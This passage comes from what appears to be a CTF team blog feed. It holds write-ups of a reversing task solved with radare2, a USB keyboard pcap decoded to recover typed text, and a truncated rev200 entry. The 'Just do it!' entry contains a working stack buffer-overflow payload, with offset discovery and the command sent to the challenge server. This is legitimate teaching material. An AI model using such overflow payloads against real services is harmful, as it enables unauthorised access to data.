<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_80487B2</span><span class="params">(_BYTE *a1)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@3</span></div><div class="line">  _BYTE *i; <span class="comment">// [sp+Ch] [bp-4h]@1</span></div><div class="line"></div><div class="line">  <span class="keyword">for</span> ( i = a1; ; ++i )</div><div class="line">  &#123;</div><div class="line">    result = *i;</div><div class="line">    <span class="keyword">if</span> ( !(_BYTE)result )</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    *i = ~*i;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>We could rewrite this functions in python and apply it into the cipher string to get the real flag back! but thats too much work why don’t we insert the ciphertext to the binary and check if it spits the flag? lets do this with radare2:</p>
<script type="text/javascript" src="https://asciinema.org/a/Kt8Sl9ZsUHUxum9sVuFIQWEIS.js" id="asciicast-Kt8Sl9ZsUHUxum9sVuFIQWEIS" async></script>

<p>And we got the flag!!! Additionally  I did a python script that interacts with radare2 using r2pipe which is a really cool python package, this script will automate what I did manually above doing a dynamic analysis:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> r2pipe</div><div class="line"><span class="keyword">import</span> struct</div><div class="line"></div><div class="line">profile = <span class="string">"""#!/usr/bin/rarun2</span></div><div class="line"><span class="string">program=./rev_rev_rev</span></div><div class="line"><span class="string">stdin=output</span></div><div class="line"><span class="string">"""</span></div><div class="line"><span class="keyword">with</span> open(<span class="string">'profile.r2'</span>,<span class="string">'w+'</span>) <span class="keyword">as</span> f:</div><div class="line">	<span class="keyword">print</span> &gt;&gt;f, profile</div><div class="line"></div><div class="line">buf = struct.pack (<span class="string">"31B"</span>, *[</div><div class="line"><span class="number">0x41</span>,<span class="number">0x29</span>,<span class="number">0xd9</span>,<span class="number">0x65</span>,<span class="number">0xa1</span>,<span class="number">0xf1</span>,<span class="number">0xe1</span>,<span class="number">0xc9</span>,<span class="number">0x19</span>,<span class="number">0x09</span>,<span class="number">0x93</span>,</div><div class="line"><span class="number">0x13</span>,<span class="number">0xa1</span>,<span class="number">0x09</span>,<span class="number">0xb9</span>,<span class="number">0x49</span>,<span class="number">0xb9</span>,<span class="number">0x89</span>,<span class="number">0xdd</span>,<span class="number">0x61</span>,<span class="number">0x31</span>,<span class="number">0x69</span>,</div><div class="line"><span class="number">0xa1</span>,<span class="number">0xf1</span>,<span class="number">0x71</span>,<span class="number">0x21</span>,<span class="number">0x9d</span>,<span class="number">0xd5</span>,<span class="number">0x3d</span>,<span class="number">0x15</span>,<span class="number">0xd5</span>])</div><div class="line"><span class="keyword">with</span> open(<span class="string">'output'</span>,<span class="string">'w+'</span>) <span class="keyword">as</span> f:</div><div class="line">	<span class="keyword">print</span> &gt;&gt;f, buf</div><div class="line"></div><div class="line"></div><div class="line">r2=r2pipe.open(<span class="string">'./rev_rev_rev'</span>)</div><div class="line">r2.cmd(<span class="string">"e dbg.profile=profile.r2"</span>)</div><div class="line">r2.cmd(<span class="string">"doo"</span>)</div><div class="line">r2.cmd(<span class="string">"db 0x804866D"</span>)</div><div class="line">r2.cmd(<span class="string">"dc"</span>)</div><div class="line">ciphertext = r2.cmd(<span class="string">"pcp 31@ 0x8048870"</span>)</div><div class="line"><span class="keyword">print</span> r2.cmd(<span class="string">"psz @ (ebp-0x2d)"</span>)</div></pre></td></tr></table></figure>
<p>Running it</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ python revrevrev.py 2&gt;/dev/null </div><div class="line">TWCTF&#123;qpzisyDnbmboz76oglxpzYdk&#125;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt; Rev Rev Rev&lt;br&gt;Problem&lt;br&gt;&lt;br&gt;&lt;a href=&quot;/content/files/tokyo-westerns-3rd-2007/rev_rev_rev&quot;&gt;rev_rev_rev&lt;/a&gt;&lt;br&gt;&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
    
      <category term="xor" scheme="https://teamrocketist.github.io/tags/xor/"/>
    
      <category term="radare2" scheme="https://teamrocketist.github.io/tags/radare2/"/>
    
      <category term="ida" scheme="https://teamrocketist.github.io/tags/ida/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] Tokyo Westerns CTF 3rd 2017 - Just do it!</title>
    <link href="https://teamrocketist.github.io/2017/09/04/Pwn-Tokyo-Westerns-CTF-3rd-2017-Just-do-it/"/>
    <id>https://teamrocketist.github.io/2017/09/04/Pwn-Tokyo-Westerns-CTF-3rd-2017-Just-do-it/</id>
    <published>2017-09-04T00:29:07.000Z</published>
    <updated>2017-09-04T07:50:31.520Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Just do it!<br>Problem<br><br>Do it! Do it!<br><br>nc pwn1.chal.ctf.westerns.tokyo 12345<br>(Alternative port: nc pwn1.chal.ctf.westerns.tokyo 12482)<br><br><a href="/content/files/tokyo-westerns-3rd-2007/just">just_do_it</a><br></blockquote>

<p>Starting by De-assembler with ida and use its ability to some c pseudo code:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+8h] [bp-20h]@7</span></div><div class="line">  FILE *stream; <span class="comment">// [sp+18h] [bp-10h]@1</span></div><div class="line">  <span class="keyword">char</span> *v6; <span class="comment">// [sp+1Ch] [bp-Ch]@1</span></div><div class="line"></div><div class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</div><div class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</div><div class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</div><div class="line">  v6 = failed_message;</div><div class="line">  stream = fopen(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>);</div><div class="line">  <span class="keyword">if</span> ( !stream )</div><div class="line">  &#123;</div><div class="line">    perror(<span class="string">"file open error.\n"</span>);</div><div class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> ( !fgets(flag, <span class="number">48</span>, stream) )</div><div class="line">  &#123;</div><div class="line">    perror(<span class="string">"file read error.\n"</span>);</div><div class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome my secret service. Do you know the password?"</span>);</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"Input the password."</span>);</div><div class="line">  <span class="keyword">if</span> ( !fgets(&amp;s, <span class="number">32</span>, <span class="built_in">stdin</span>) )</div><div class="line">  &#123;</div><div class="line">    perror(<span class="string">"input error.\n"</span>);</div><div class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s, PASSWORD) )</div><div class="line">    v6 = success_message;</div><div class="line">  <span class="built_in">puts</span>(v6);</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>We can see clearly there is a buffer overflow problem on <code>strcmp</code> PASSWORD comes from <code>STDIN</code>, if we give a password greater than the variable s can handle, we will overflow in this one we don’t even need to modify the ret address. We can just modify the address from v6 to the flag variable address! which is stored from a file “flag.txt” in the server.  </p>
<p>First lets just discover the offset we could know this by looking at the assembly code and check how space was saved in the stack for this variable by looking the offset from ebp or we can just use gdb with some help from metasploit to generate patterns:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 50 </div><div class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab</div><div class="line">$ gdb ./justdoit</div><div class="line">pwndbg&gt; r</div><div class="line">Starting program: /home/evilgod/Documents/Hacking/ctf/tokyo/pwn/justdoit/just </div><div class="line">Welcome my secret service. Do you know the password?</div><div class="line">Input the password.</div><div class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab</div><div class="line"></div><div class="line">Program received signal SIGSEGV (fault address 0x37614136)</div></pre></td></tr></table></figure>
<p>We can see it broke at address <code>0x37614136</code> we again can calculate it in metasploit with pattern_offset</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x37614136</div><div class="line">[*] Exact match at offset 20</div></pre></td></tr></table></figure>
<p>Now we can see we need to add more than 20 characters to overflow! now lets use IDA to get the address where is stored our flag:  </p>
<p><img src="https://i.imgur.com/kvzhTyr.png" alt="Flag Address"></p>
<p>And finally writing a script:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">FLAG = <span class="number">0x0804A080</span></div><div class="line">payload = <span class="string">'A'</span> *<span class="number">20</span> + struct.pack(<span class="string">'&lt;L'</span>,FLAG)</div><div class="line"><span class="keyword">print</span> payload</div></pre></td></tr></table></figure>
<p>getting the flag….<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ python justdoit.py | nc pwn1.chal.ctf.westerns.tokyo 12482</div><div class="line">Welcome my secret service. Do you know the password?</div><div class="line">Input the password.</div><div class="line">TWCTF&#123;pwnable_warmup_I_did_it!&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Just do it!&lt;br&gt;Problem&lt;br&gt;&lt;br&gt;Do it! Do it!&lt;br&gt;&lt;br&gt;nc pwn1.chal.ctf.westerns.tokyo 12345&lt;br&gt;(Alternative port: nc pwn1.chal.
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
    
      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
    
      <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
    
  </entry>
  
  <entry>
    <title>[Forensics] Hackit 2017 - USB ducker</title>
    <link href="https://teamrocketist.github.io/2017/08/29/Forensics-Hackit-2017-USB-ducker/"/>
    <id>https://teamrocketist.github.io/2017/08/29/Forensics-Hackit-2017-USB-ducker/</id>
    <published>2017-08-29T16:25:11.000Z</published>
    <updated>2017-08-29T17:21:15.212Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>USB ducker<br>foren100<br><br>Description: This file was captured from one of the computers at the Internet cafe. We think that the hacker was using this computer at that time. Try to get his secret documents. ( flag format is flag{…} )<br><br>Attachment: (none)<br><br>Webpage: <a href="https://mega.nz/#!NVJ1kZCR!mDxd7V0rHtMStePa-tUEHPW-SyAxQ6f1zRDCTxX8y3M" target="_blank" rel="external">https://mega.nz/#!NVJ1kZCR!mDxd7V0rHtMStePa-tUEHPW-SyAxQ6f1zRDCTxX8y3M</a><br><br>Hint: (none)<br></blockquote>

<p>Another USB pcap, after analysing it with wireshark we can see that we have two devices one is a keyboard(bInterfaceClass: HID: 0x3) and the other is a mouse(Unknown)…   </p>
<h4 id="Mouse"><a href="#Mouse" class="headerlink" title="Mouse"></a>Mouse</h4><p><img src="https://i.imgur.com/D8RJ4RK.png" alt="keyboard"></p>
<h4 id="Keyboard"><a href="#Keyboard" class="headerlink" title="Keyboard"></a>Keyboard</h4><p><img src="https://i.imgur.com/z4ugtLV.png" alt="keyboard"></p>
<p>We can clearly see we that HID: 0x3 is a keyboard by searching for strings in wireshark EDIT -&gt; Find Packet<br><img src="https://i.imgur.com/JYLtVK1.png" alt="keyboard"></p>
<p>I actually tried to see what the hacker did with the mouse but didn’t found anything special just a straight line of clicks you could parse the mouse inputs with tshark like this for example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tshark -r task.pcap -Y <span class="string">"usb.transfer_type == 0x01 &amp;&amp; usb.bInterfaceClass!=3"</span> -Tfields -e usb.capdata &gt; mouse</div></pre></td></tr></table></figure></p>
<p>Moving on to the keyboard since the mouse didn’t got us anything special we just got the output from the keyboard<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tshark -r task.pcap -Y <span class="string">"usb.transfer_type == 0x01 &amp;&amp; usb.bInterfaceClass==3"</span> -Tfields -e usb.capdata &gt; keyboard</div></pre></td></tr></table></figure></p>
<p>Now the tricky part here is, the hacker used the arrow keys! making it harder to make a script to spit out the keyboard inputs, well during the CTF I got frustrated, and choose to make it by hand by looking at the table on <a href="http://www.usb.org/developers/hidpage/Hut1_12v2.pdf" target="_blank" rel="external">http://www.usb.org/developers/hidpage/Hut1_12v2.pdf</a> (table 12). The keyboard inputs can be read like this:   </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">      |-&gt; The value of the keypressed you can &quot;decode&quot; this value from the table 12 above</div><div class="line">      |</div><div class="line">02:00:20:00:00:00:00:00</div><div class="line">| </div><div class="line">|--&gt; This value is 02 when shift is pressed and 00 when it isn&apos;t</div></pre></td></tr></table></figure>
<p>When the CTF finished I ended up doing a script to do this (it’s not perfect there is alot of more things to consider).</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"> <span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line">KEY_CODES = &#123;</div><div class="line">    <span class="number">0x04</span>:[<span class="string">'a'</span>, <span class="string">'A'</span>],</div><div class="line">    <span class="number">0x05</span>:[<span class="string">'b'</span>, <span class="string">'B'</span>],</div><div class="line">    <span class="number">0x06</span>:[<span class="string">'c'</span>, <span class="string">'C'</span>],</div><div class="line">    <span class="number">0x07</span>:[<span class="string">'d'</span>, <span class="string">'D'</span>],</div><div class="line">    <span class="number">0x08</span>:[<span class="string">'e'</span>, <span class="string">'E'</span>],</div><div class="line">    <span class="number">0x09</span>:[<span class="string">'f'</span>, <span class="string">'F'</span>],</div><div class="line">    <span class="number">0x0A</span>:[<span class="string">'g'</span>, <span class="string">'G'</span>],</div><div class="line">    <span class="number">0x0B</span>:[<span class="string">'h'</span>, <span class="string">'H'</span>],</div><div class="line">    <span class="number">0x0C</span>:[<span class="string">'i'</span>, <span class="string">'I'</span>],</div><div class="line">    <span class="number">0x0D</span>:[<span class="string">'j'</span>, <span class="string">'J'</span>],</div><div class="line">    <span class="number">0x0E</span>:[<span class="string">'k'</span>, <span class="string">'K'</span>],</div><div class="line">    <span class="number">0x0F</span>:[<span class="string">'l'</span>, <span class="string">'L'</span>],</div><div class="line">    <span class="number">0x10</span>:[<span class="string">'m'</span>, <span class="string">'M'</span>],</div><div class="line">    <span class="number">0x11</span>:[<span class="string">'n'</span>, <span class="string">'N'</span>],</div><div class="line">    <span class="number">0x12</span>:[<span class="string">'o'</span>, <span class="string">'O'</span>],</div><div class="line">    <span class="number">0x13</span>:[<span class="string">'p'</span>, <span class="string">'P'</span>],</div><div class="line">    <span class="number">0x14</span>:[<span class="string">'q'</span>, <span class="string">'Q'</span>],</div><div class="line">    <span class="number">0x15</span>:[<span class="string">'r'</span>, <span class="string">'R'</span>],</div><div class="line">    <span class="number">0x16</span>:[<span class="string">'s'</span>, <span class="string">'S'</span>],</div><div class="line">    <span class="number">0x17</span>:[<span class="string">'t'</span>, <span class="string">'T'</span>],</div><div class="line">    <span class="number">0x18</span>:[<span class="string">'u'</span>, <span class="string">'U'</span>],</div><div class="line">    <span class="number">0x19</span>:[<span class="string">'v'</span>, <span class="string">'V'</span>],</div><div class="line">    <span class="number">0x1A</span>:[<span class="string">'w'</span>, <span class="string">'W'</span>],</div><div class="line">    <span class="number">0x1B</span>:[<span class="string">'x'</span>, <span class="string">'X'</span>],</div><div class="line">    <span class="number">0x1C</span>:[<span class="string">'y'</span>, <span class="string">'Y'</span>],</div><div class="line">    <span class="number">0x1D</span>:[<span class="string">'z'</span>, <span class="string">'Z'</span>],</div><div class="line">    <span class="number">0x1E</span>:[<span class="string">'1'</span>, <span class="string">'!'</span>],</div><div class="line">    <span class="number">0x1F</span>:[<span class="string">'2'</span>, <span class="string">'@'</span>],</div><div class="line">    <span class="number">0x20</span>:[<span class="string">'3'</span>, <span class="string">'#'</span>],</div><div class="line">    <span class="number">0x21</span>:[<span class="string">'4'</span>, <span class="string">'$'</span>],</div><div class="line">    <span class="number">0x22</span>:[<span class="string">'5'</span>, <span class="string">'%'</span>],</div><div class="line">    <span class="number">0x23</span>:[<span class="string">'6'</span>, <span class="string">'^'</span>],</div><div class="line">    <span class="number">0x24</span>:[<span class="string">'7'</span>, <span class="string">'&amp;'</span>],</div><div class="line">    <span class="number">0x25</span>:[<span class="string">'8'</span>, <span class="string">'*'</span>],</div><div class="line">    <span class="number">0x26</span>:[<span class="string">'9'</span>, <span class="string">'('</span>],</div><div class="line">    <span class="number">0x27</span>:[<span class="string">'0'</span>, <span class="string">')'</span>],</div><div class="line">    <span class="number">0x28</span>:[<span class="string">'\n'</span>,<span class="string">'\n'</span>],</div><div class="line">    <span class="number">0x2C</span>:[<span class="string">' '</span>, <span class="string">' '</span>],</div><div class="line">    <span class="number">0x2D</span>:[<span class="string">'-'</span>, <span class="string">'_'</span>],</div><div class="line">    <span class="number">0x2E</span>:[<span class="string">'='</span>, <span class="string">'+'</span>],</div><div class="line">    <span class="number">0x2F</span>:[<span class="string">'['</span>, <span class="string">'&#123;'</span>],</div><div class="line">    <span class="number">0x30</span>:[<span class="string">']'</span>, <span class="string">'&#125;'</span>],</div><div class="line">    <span class="number">0x32</span>:[<span class="string">'#'</span>,<span class="string">'~'</span>],</div><div class="line">    <span class="number">0x33</span>:[<span class="string">';'</span>, <span class="string">':'</span>],</div><div class="line">    <span class="number">0x34</span>:[<span class="string">'\''</span>, <span class="string">'"'</span>],</div><div class="line">    <span class="number">0x36</span>:[<span class="string">','</span>, <span class="string">'&lt;'</span>],</div><div class="line">    <span class="number">0x38</span>:[<span class="string">'/'</span>, <span class="string">'?'</span>],</div><div class="line">    <span class="number">0x37</span>:[<span class="string">'.'</span>, <span class="string">'&gt;'</span>],</div><div class="line">    <span class="number">0x2b</span>:[<span class="string">'\t'</span>,<span class="string">'\t'</span>],</div><div class="line">    <span class="number">0x4f</span>:[<span class="string">u'→'</span>,<span class="string">u'→'</span>],</div><div class="line">    <span class="number">0x50</span>:[<span class="string">u'←'</span>,<span class="string">u'←'</span>],</div><div class="line">    <span class="number">0x51</span>:[<span class="string">u'↓'</span>,<span class="string">u'↓'</span>],</div><div class="line">    <span class="number">0x52</span>:[<span class="string">u'↑'</span>,<span class="string">u'↑'</span>]</div><div class="line">&#125;</div><div class="line">   </div><div class="line"><span class="comment">#tshark -r ./usb.pcap -Y 'usb.capdata' -T fields -e usb.capdata &gt; keyboards.txt</span></div><div class="line">datas = open(<span class="string">'keyboard'</span>).read().split(<span class="string">'\n'</span>)[:<span class="number">-1</span>]</div><div class="line">cursor_x = <span class="number">0</span></div><div class="line">cursor_y = <span class="number">0</span></div><div class="line">offset_current_line = <span class="number">0</span></div><div class="line">lines = [<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>]</div><div class="line">output = <span class="string">''</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> data <span class="keyword">in</span> datas:</div><div class="line">    shift = int(data.split(<span class="string">':'</span>)[<span class="number">0</span>], <span class="number">16</span>) / <span class="number">2</span></div><div class="line">    key = int(data.split(<span class="string">':'</span>)[<span class="number">2</span>], <span class="number">16</span>)</div><div class="line">    <span class="keyword">if</span> key == <span class="number">0</span>:</div><div class="line">        <span class="keyword">continue</span></div><div class="line">    <span class="keyword">if</span> KEY_CODES[key][shift] == <span class="string">u'↑'</span>:</div><div class="line">        lines[cursor_y] += output</div><div class="line">        output = <span class="string">''</span></div><div class="line">        cursor_y -= <span class="number">1</span></div><div class="line">    <span class="keyword">elif</span> KEY_CODES[key][shift] == <span class="string">u'↓'</span>:</div><div class="line">        lines[cursor_y] += output</div><div class="line">        output = <span class="string">''</span></div><div class="line">        cursor_y += <span class="number">1</span></div><div class="line">    <span class="keyword">elif</span> KEY_CODES[key][shift] == <span class="string">u'→'</span>:</div><div class="line">        cursor_x += <span class="number">1</span></div><div class="line">    <span class="keyword">elif</span> KEY_CODES[key][shift] == <span class="string">u'←'</span>:</div><div class="line">        cursor_x -= <span class="number">1</span></div><div class="line">    <span class="keyword">elif</span> KEY_CODES[key][shift] == <span class="string">'\n'</span>:</div><div class="line">        lines[cursor_y] += output</div><div class="line">        cursor_x = <span class="number">0</span></div><div class="line">        cursor_y += <span class="number">1</span></div><div class="line">        output = <span class="string">''</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        output += KEY_CODES[key][shift]</div><div class="line">        cursor_x += <span class="number">1</span></div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">'\n'</span>.join(lines)</div></pre></td></tr></table></figure>
<p>Now running the script</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">teamrocketist@Debian ~/D/H/c/h/f/for100&gt; python key2.py</div><div class="line">w&#123;w<span class="variable">$ju</span>&#125;,<span class="string">'pt]=j%;9+ps&amp;#,</span></div><div class="line"><span class="string">k#&gt;bn$:6pjim0&#123;u'</span>h;fks!s-</div><div class="line">flag&#123;k3yb0ard_sn4ke_2.0&#125;</div><div class="line">b[[e[fu~7d[=&gt;*(0]<span class="string">'$1c$ce</span></div><div class="line"><span class="string">3'</span>ci.[%=%&amp;k(lc*2y4!&#125;%qz3</div></pre></td></tr></table></figure>
<p>The flag is flag{k3yb0ard_sn4ke_2.0}</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;USB ducker&lt;br&gt;foren100&lt;br&gt;&lt;br&gt;Description: This file was captured from one of the computers at the Internet cafe. We think t
    
    </summary>
    
      <category term="Forensics" scheme="https://teamrocketist.github.io/categories/Forensics/"/>
    
    
      <category term="forensics" scheme="https://teamrocketist.github.io/tags/forensics/"/>
    
      <category term="pcap" scheme="https://teamrocketist.github.io/tags/pcap/"/>
    
      <category term="keyboard" scheme="https://teamrocketist.github.io/tags/keyboard/"/>
    
      <category term="mouse" scheme="https://teamrocketist.github.io/tags/mouse/"/>
    
      <category term="wireshark" scheme="https://teamrocketist.github.io/tags/wireshark/"/>
    
      <category term="tshark" scheme="https://teamrocketist.github.io/tags/tshark/"/>
    
      <category term="usb" scheme="https://teamrocketist.github.io/tags/usb/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] Hackit 2017 - rev200</title>
    <link href="https://teamrocketist.github.io/2017/08/27/Reverse-Hackit-2017-rev200/"/>
    <id>https://teamrocketist.github.io/2017/08/27/Reverse-Hackit-2017-rev200/</id>
    <published>2017-08-27T22:21:35.000Z</published>
    <updated>2017-08-27T23:26:57.663Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>rev200<br><br>Description: You haxor, come on you little sciddie… debug me, eh? You fucking little lamer… You fuckin’ come on, come debug me! I’ll get your ass, you jerk! Oh, you IDA monkey! Fuck all you and your tools! Come on, you scum haxor, you try to reverse me? Come on, you asshole!!<br><br>Attachment: (none)<br><br>Webpage: <a href="https://mega.nz/#!RQJk0ZbR!7myppeUU6fwqRY2cOaX8EPTpC9pVIHEsWdUNw0szexc" target="_blank" rel="external">https://mega.nz/#!RQJk0ZbR!7myppeUU6fwqRY2cOaX8EPTpC9pVIHEsWdUNw0szexc</a><br><br>Hint: (none)<br></blockquote>

<p>When I looked up into this challenge I just checked the assembly code and found it way too easy for 200 points, but then I saw something weird I couldn’t start it for debugging and then I checked the file types:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ file rev200\ \(1\).efi </div><div class="line">rev200 (1).efi: PE32+ executable (DLL) (EFI application) x86-64 (stripped to external PDB), <span class="keyword">for</span> MS Windows</div></pre></td></tr></table></figure>
<p>Oh its a ddl, that’s why well I still found it way to easy for all this points specially because with IDA we can convert this beautiful assembly code(missing the code for algo function):<br><img src="https://i.imgur.com/F3vhOvA.png" alt="Assembly IDA"></p>
<p>Into this beautiful “pseudo c” code(press F5 in IDA), well it makes everything much easier even thought the assembly wasn’t that hard to reverse…. Here we have the pseudo c code for “main” function and “algo” function…</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div 